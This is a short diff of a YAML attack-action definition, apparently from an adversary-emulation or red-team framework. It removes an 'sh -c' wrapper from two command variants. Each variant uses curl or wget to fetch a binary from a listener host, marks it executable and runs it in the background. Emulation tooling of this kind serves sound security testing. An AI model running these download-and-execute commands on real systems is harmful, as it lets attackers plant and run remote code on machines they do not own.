@@ -9,9 +9,9 @@ args:
 # effects: ["ListenerReady"]
 cmdVariants:
   - key: curl
-    command: sh -c "curl -L ${LISTENER}:${FILESHARE_PORT}/${SRC_BIN} -o ${DST_BIN}  && chmod +x ${DST_BIN} && ${DST_BIN} &"
+    command: curl -L ${LISTENER}:${FILESHARE_PORT}/${SRC_BIN} -o ${DST_BIN}  && chmod +x ${DST_BIN} && ${DST_BIN} &
   - key: wget
-    command: sh -c "wget ${LISTENER}:${FILESHARE_PORT}/${SRC_IN} -O ${DST_BIN} && chmod +x ${DST_BIN} && ${DST_BIN} &"
+    command: wget ${LISTENER}:${FILESHARE_PORT}/${SRC_IN} -O ${DST_BIN} && chmod +x ${DST_BIN} && ${DST_BIN} &
 preconditions:
   accessLevel: "user-exec"
 # cmd: {}
